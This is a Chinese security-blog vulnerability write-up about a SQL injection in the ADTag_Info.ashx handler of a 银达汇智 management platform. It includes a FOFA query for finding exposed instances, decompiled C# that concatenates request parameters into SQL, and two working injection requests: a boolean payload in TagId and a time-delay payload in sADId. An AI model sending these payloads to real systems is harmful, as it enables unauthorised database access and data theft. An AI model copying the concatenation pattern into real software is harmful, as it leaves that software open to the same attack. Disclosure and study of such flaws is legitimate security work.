---
title: "银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag_Info-sqli.html
---

# 银达汇智智慧综合管理平台 ADTag\_Info.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/28 08:16
* 875浏览
* [0评论](#comment)
* 3小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

福建银达汇智信息科技股份有限公司成立于2009年，位于福建省福州市，是一家以从事软件和信息技术服务业为主的企业。银达汇智智慧综合管理平台
`ADTag_Info.ashx`
存在
[SQL注入](https://mrxn.net/tag/SQL注入)
漏洞,攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 影响版本

# fofa语法

> `title="智慧综合管理平台登入"`

# 漏洞分析

先看
`ADTag_Info.ashx`
页面引用的dll

```
<%@ WebHandler Language="C#" CodeBehind="ADTag_Info.ashx.cs" Class="KR.Administrator.Module.Controller.ADTag_Info"  %>
```

其中
`Module/AD/AD_Tag/Controller/ADTag_Info.ashx`
和
`Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx`
代码一致，分析其中之一即可。

再看
`KR.Administrator.Module.Controller.ADTag_Info`
的业务逻辑实现

```
namespace KR.Administrator.Module.Controller;

public class ADTag_Info : IHttpHandler, IRequiresSessionState
{
  private ADInfoDao bll = new ADInfoDao();

  public void ProcessRequest(HttpContext context)
  {
    context.Response.ContentType = "text/plain";
    string str1 = WRequest.GetString("action");
    try
    {
      if (string.op_Equality(str1, "find"))
      {
        int recordcount = 0;
        string strWhere = " 1=1 ";
        if (!string.IsNullOrEmpty(WRequest.GetString("Ad_Id")))
          strWhere += $" and ADTypePreID = '{WRequest.GetString("Ad_Id")}'";
        DataTable dataTableList = this.bll.GetDataTableList(WRequest.GetInt("pagesize") == 0 ? 20 : WRequest.GetInt("pagesize"), WRequest.GetInt("pageIndex") == 0 ? 1 : WRequest.GetInt("pageIndex") + 1, "*", $" {(string.IsNullOrEmpty(WRequest.GetString("SortField")) ? (object) "id" : (object) WRequest.GetString("SortField"))} {(string.IsNullOrEmpty(WRequest.GetString("SortOrder")) ? (object) "desc" : (object) WRequest.GetString("SortOrder"))}", strWhere, out recordcount);
        DataGridModel dataGridModel = new DataGridModel()
        {
          total = recordcount,
          data = dataTableList
        };
        context.Response.Write(JsonConvert.SerializeObject((object) dataGridModel));
        KR.Controls.Log.LogHelper.SysInfo("：查看！", new Exception(context.Request.Form.ToString()));
      }
      else if (string.op_Equality(str1, "save"))
        this.save(context);
      else if (string.op_Equality(str1, "look") || string.op_Equality(str1, "update"))
      {
        Windor.JR.Model.ADInfo adInfo = this.bll.GetItem((long) WRequest.GetInt("id"));
        context.Response.Write(JsonConvert.SerializeObject((object) adInfo));
      }
      else if (string.op_Equality(str1, "selectedDel"))
      {
        if (SystemHelper.checkPermission("ADInfo_btnDel"))
        {
          string str2 = WRequest.GetString("ids");
          if (!string.IsNullOrEmpty(str2))
          {
            IList<Windor.JR.Model.ADInfo> list = (IList<Windor.JR.Model.ADInfo>) this.bll.GetList($"id in ({str2}) ");
            KR.Controls.Log.LogHelper.SysInfo("：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
            StringBuilder stringBuilder = new StringBuilder();
            foreach (Windor.JR.Model.ADInfo adInfo in (IEnumerable<Windor.JR.Model.ADInfo>) list)
            {
              stringBuilder.Append(adInfo.id);
              stringBuilder.Append(",");
            }
            this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
            {
              ','
            }), Comparison.In));
            context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
          }
          else
            context.Response.Write(SystemHelper.WriteResult("error", "请选择要删除项！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      }
      else if (string.op_Equality(str1, "conditionDel"))
      {
        if (SystemHelper.checkPermission("ADInfo_btnDel"))
        {
          string strWhere = " 1=1 ";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADId")))
            strWhere += $" and ADId like '%{WRequest.GetString("ADId")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("StartDateBegin")))
            strWhere += $" and StartDate >= '{WRequest.GetString("StartDateBegin")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("StartDateEnd")))
            strWhere += $" and StartDate < '{WRequest.GetString("StartDateEnd")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("EndDateBegin")))
            strWhere += $" and EndDate >= '{WRequest.GetString("EndDateBegin")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("EndDateEnd")))
            strWhere += $" and EndDate < '{WRequest.GetString("EndDateEnd")}'";
          if (!string.IsNullOrEmpty(WRequest.GetString("Caption")))
            strWhere += $" and Caption like '%{WRequest.GetString("Caption")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADTypeBegin")))
            strWhere += $" and ADType >= {WRequest.GetString("ADTypeBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADTypeEnd")))
            strWhere += $" and ADType < {WRequest.GetString("ADTypeEnd")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("ContentTypeBegin")))
            strWhere += $" and ContentType >= {WRequest.GetString("ContentTypeBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("ContentTypeEnd")))
            strWhere += $" and ContentType < {WRequest.GetString("ContentTypeEnd")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("Content")))
            strWhere += $" and Content like '%{WRequest.GetString("Content")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("OrgId")))
            strWhere += $" and OrgId like '%{WRequest.GetString("OrgId")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("ADTypePreID")))
            strWhere += $" and ADTypePreID like '%{WRequest.GetString("ADTypePreID")}%'";
          if (!string.IsNullOrEmpty(WRequest.GetString("org_idBegin")))
            strWhere += $" and org_id >= {WRequest.GetString("org_idBegin")}";
          if (!string.IsNullOrEmpty(WRequest.GetString("org_idEnd")))
            strWhere += $" and org_id < {WRequest.GetString("org_idEnd")}";
          IList<Windor.JR.Model.ADInfo> list = (IList<Windor.JR.Model.ADInfo>) this.bll.GetList(strWhere);
          KR.Controls.Log.LogHelper.SysInfo("：删除！", new Exception(JsonConvert.SerializeObject((object) list)));
          StringBuilder stringBuilder = new StringBuilder();
          foreach (Windor.JR.Model.ADInfo adInfo in (IEnumerable<Windor.JR.Model.ADInfo>) list)
          {
            stringBuilder.Append(adInfo.id);
            stringBuilder.Append(",");
          }
          if (stringBuilder.Length > 0)
          {
            this.bll.Delete((ICondition) new Condition("id", FieldType.Int32, (object) stringBuilder.ToString().Trim(new char[1]
            {
              ','
            }), Comparison.In));
            context.Response.Write(SystemHelper.WriteResult("success", "删除成功！"));
          }
          else
            context.Response.Write(SystemHelper.WriteResult("error", "未找到符合条件的数据！"));
        }
        else
          context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      }
      else if (string.op_Equality(str1, "exportExcel"))
        this.exportExcel(context);
      else if (string.op_Equality(str1, "findAD_Type"))
      {
        DataTable adType = this.bll.getAD_Type();
        context.Response.Write(JsonConvert.SerializeObject((object) adType));
      }
      else if (string.op_Equality(str1, "findCheckData"))
      {
        string empty = string.Empty;
        DataTable dataTable = new DataTable();
        if (!string.IsNullOrEmpty(WRequest.GetString("TagId")))
          dataTable = this.bll.getInfoCheckData(WRequest.GetString("TagId"));
        context.Response.Write(JsonConvert.SerializeObject((object) dataTable));
      }
      else
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
    }
    catch (Exception ex)
    {
      KR.Controls.Log.LogHelper.SysError($"：操作异常！action:{str1};Form:{context.Request.Form.ToString()}", ex);
      context.Response.Write(SystemHelper.WriteResult("error", ex.Message.Replace("\"", "'")));
    }
  }

  private void save(HttpContext context)
  {
    Windor.JR.Model.ADInfo model = new Windor.JR.Model.ADInfo();
    model.id = WRequest.GetInt("id");
    if (model.id != 0)
    {
      model = this.bll.GetItem((long) model.id);
      if (model == null)
      {
        context.Response.Write(SystemHelper.WriteResult("error", "数据保存失败！指定的记录不存在或已经被其他用户删除！"));
        return;
      }
    }
    model.ADId = string.IsNullOrEmpty(WRequest.GetString("ADId").Trim()) ? Guid.NewGuid() : new Guid(WRequest.GetString("ADId").Trim());
    model.StartDate = string.IsNullOrEmpty(WRequest.GetString("StartDate")) ? new DateTime?() : WRequest.GetString("StartDate").ToDateTime();
    model.EndDate = string.IsNullOrEmpty(WRequest.GetString("EndDate")) ? new DateTime?() : WRequest.GetString("EndDate").ToDateTime();
    model.Caption = WRequest.GetString("Caption").Trim();
    model.ADType = WRequest.GetInt("ADType");
    model.ContentType = WRequest.GetInt("ContentType");
    model.Content = WRequest.GetString("Content").Trim();
    model.OrgId = WRequest.GetString("OrgId").Trim();
    if (!string.IsNullOrEmpty(WRequest.GetString("ADTypePreID").Trim()))
      model.ADTypePreID = new Guid(WRequest.GetString("ADTypePreID").Trim());
    model.org_id = WRequest.GetInt("org_id");
    bool flag1;
    bool flag2;
    if (model.id != 0)
    {
      if (SystemHelper.checkPermission("ADInfo_btnUpdate"))
      {
        flag1 = this.bll.Update(model);
        KR.Controls.Log.LogHelper.SysInfo(string.Format("：修改！", new object[0]), new Exception(JsonConvert.SerializeObject((object) model)));
        flag2 = true;
      }
      else
      {
        context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
        return;
      }
    }
    else if (SystemHelper.checkPermission("ADInfo_btnAdd"))
    {
      flag1 = this.bll.Add(model) > 0L;
      KR.Controls.Log.LogHelper.SysInfo(string.Format("：新增！", new object[0]), new Exception(JsonConvert.SerializeObject((object) model)));
      flag2 = false;
    }
    else
    {
      context.Response.Write(SystemHelper.WriteResult("error", "您无权限或者访问异常！请联系管理人员。"));
      return;
    }
    if (flag1)
    {
      if (flag2)
        context.Response.Write(SystemHelper.WriteResult("success", "修改成功！", "update"));
      else
        context.Response.Write(SystemHelper.WriteResult("success", "新增成功！", "add"));
    }
    else
      context.Response.Write(SystemHelper.WriteResult("error", "数据保存失败！操作过程中出现异常！"));
  }

  private void exportExcel(HttpContext context)
  {
    string condition = " 1=1 ";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADId")))
      condition += $" and ADId like '%{WRequest.GetString("sADId")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sStartDateBegin")))
      condition += $" and StartDate >= '{WRequest.GetString("sStartDateBegin")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sStartDateEnd")))
      condition += $" and StartDate < '{WRequest.GetString("sStartDateEnd")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sEndDateBegin")))
      condition += $" and EndDate >= '{WRequest.GetString("sEndDateBegin")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sEndDateEnd")))
      condition += $" and EndDate < '{WRequest.GetString("sEndDateEnd")}'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sCaption")))
      condition += $" and Caption like '%{WRequest.GetString("sCaption")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADTypeBegin")))
      condition += $" and ADType >= {WRequest.GetString("sADTypeBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADTypeEnd")))
      condition += $" and ADType < {WRequest.GetString("sADTypeEnd")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sContentTypeBegin")))
      condition += $" and ContentType >= {WRequest.GetString("sContentTypeBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sContentTypeEnd")))
      condition += $" and ContentType < {WRequest.GetString("sContentTypeEnd")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sContent")))
      condition += $" and Content like '%{WRequest.GetString("sContent")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sOrgId")))
      condition += $" and OrgId like '%{WRequest.GetString("sOrgId")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sADTypePreID")))
      condition += $" and ADTypePreID like '%{WRequest.GetString("sADTypePreID")}%'";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idBegin")))
      condition += $" and org_id >= {WRequest.GetString("sorg_idBegin")}";
    if (!string.IsNullOrEmpty(WRequest.GetString("sorg_idEnd")))
      condition += $" and org_id < {WRequest.GetString("sorg_idEnd")}";
    DataTable dataTabelToExcel = this.bll.GetDataTabelToExcel(KR.Controls.RunTime.Global.webSiteConfig.ExportCount, condition);
    if (((InternalDataCollectionBase) dataTabelToExcel.Rows).Count <= 0)
      return;
    SystemHelper.CreateExcel(dataTabelToExcel, "application/x-excel", DateTime.Now.ToString("yyyyMMddHHmmssfff"), context, "导出Excel表");
  }

  public bool IsReusable => false;
}
```

在
`ADTag_Info`
类的
`ProcessRequest`
方法中，多个操作（如
`find`
、
`conditionDel`
、
`selectedDel`
、
`exportExcel`
、
`findCheckData`
）直接使用用户可控参数拼接SQL语句，未进行有效的过滤或参数化处理，导致攻击者可构造恶意输入执行任意SQL命令。

其中
`selectedDel`
、
`conditionDel`
以及
`save`
均需要权限验证，暂不考虑。重点看其他几个处理逻辑。

`findCheckData`
里将获取的
`TagId`
直接带入
`getInfoCheckData`
方法，看下其实现如下

```
public DataTable getInfoCheckData(string TagId)
  {
    string sql = $"select ai.* from AD_Tag at \r\n                        inner join dbo.AD_Info_Tag_Mod ait on CONVERT(varchar(100),at.TagId) = ait.TagID\r\n                        inner join AD_Info ai on ai.ADId = ait.AD_Info_ID\r\n                        where at.TagId = '{TagId}'";
    return DbHelperFactory.GetDbHelper().Query(sql).Tables[0];
  }
```

在
`getInfoCheckData`
方法中，直接使用用户输入的
`TagId`
参数拼接SQL语句，未进行任何过滤或参数化处理，导致攻击者可通过构造恶意输入执行任意SQL命令。但是
`find`
的this.bll.GetDataTableList 构造使用储存过程执行sql，存不存在sql注入取决于储存过程
`UP_GetRecordByPage`
的写法。

```
public override DataTable GetDataTableList(
  string tableOrView,
  int PageSize,
  int PageIndex,
  string fieldName,
  string orderFields,
  string strWhere,
  out int recordcount)
{
  if ((object) this.Model == null)
    throw new InvalidOperationException("无效的 Model 属性，在调用本函数前请先设置 Model 属性。");
  SqlParameter[] sqlParameterArray1 = new SqlParameter[6]
  {
    new SqlParameter("@tblName", (SqlDbType) 22, -1),
    new SqlParameter("@fieldName", (SqlDbType) 22, -1),
    new SqlParameter("@OrderField", (SqlDbType) 22, -1),
    new SqlParameter("@PageSize", (SqlDbType) 8),
    new SqlParameter("@PageIndex", (SqlDbType) 8),
    new SqlParameter("@strWhere", (SqlDbType) 22, -1)
  };
  int num1 = 0;
  SqlParameter[] sqlParameterArray2 = sqlParameterArray1;
  int index1 = num1;
  int num2 = index1 + 1;
  ((DbParameter) sqlParameterArray2[index1]).Value = (object) tableOrView;
  SqlParameter[] sqlParameterArray3 = sqlParameterArray1;
  int index2 = num2;
  int num3 = index2 + 1;
  ((DbParameter) sqlParameterArray3[index2]).Value = !string.IsNullOrEmpty(fieldName) ? (object) fieldName : (object) " * ";
  SqlParameter[] sqlParameterArray4 = sqlParameterArray1;
  int index3 = num3;
  int num4 = index3 + 1;
  ((DbParameter) sqlParameterArray4[index3]).Value = !string.IsNullOrEmpty(orderFields) ? (object) orderFields : (object) this.Model.GetPrimaryFields();
  SqlParameter[] sqlParameterArray5 = sqlParameterArray1;
  int index4 = num4;
  int num5 = index4 + 1;
  ((DbParameter) sqlParameterArray5[index4]).Value = (object) PageSize;
  SqlParameter[] sqlParameterArray6 = sqlParameterArray1;
  int index5 = num5;
  int num6 = index5 + 1;
  ((DbParameter) sqlParameterArray6[index5]).Value = (object) PageIndex;
  SqlParameter[] sqlParameterArray7 = sqlParameterArray1;
  int index6 = num6;
  int num7 = index6 + 1;
  ((DbParameter) sqlParameterArray7[index6]).Value = !string.IsNullOrEmpty(strWhere) ? (object) strWhere : (object) "";
  DataSet dataSet = this.CurrentHelper.ExecuteProcedure("UP_GetRecordByPage", "ds", (IDataParameter[]) sqlParameterArray1);
  recordcount = 0;
  if (((InternalDataCollectionBase) dataSet.Tables).Count > 0)
    recordcount = Convert.ToInt32(dataSet.Tables[1].Rows[0][0].ToString());
  return dataSet.Tables[0];
}
```

如果是如下写法

```
DECLARE @sql NVARCHAR(MAX)
SET @sql = 'SELECT ... FROM ' + @tblName + ' WHERE 1=1 ' + @strWhere + ' ORDER BY ...'
EXEC(@sql)
```

那么传入的
`@strWhere`
里的内容
**不会再参数化**
，而是直接拼在SQL字符串中执行，则会造成
[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
漏洞。

整体执行流程如下图所示：

# 漏洞复现

## action=findCheckData

```
POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=findCheckData&TagId='or '1'='1
```

![银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞](https://image.mrxn.net/e578133f05e74c808fc3b7094b2a9046.webp)

布尔注入，结果出现差异

![银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞](https://image.mrxn.net/746d4a3039cc4a6ca0db618669bb149d.webp)

## action=exportExcel

```
POST /Module/BPCJ/AD_Tag/Controller/ADTag_Info.ashx HTTP/1.1
Host: windor.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=exportExcel&sADId='waitfor+delay'0:0:4'--
```

![银达汇智智慧综合管理平台 ADTag_Info.ashx SQL注入漏洞](https://image.mrxn.net/f655d3b6a88b4d76aa58168d35fbca7f.webp)

成功延时 4 秒

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#
  asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[银达汇智智慧综合管理平台 ADTag\_Info.ashx SQL注入漏洞](https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag_Info-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/windor-Module-BPCJ-AD_Tag-Controller-ADTag_Info-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/windor-Module-BPCJ-AD\_Tag-Controller-ADTag\_Info-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
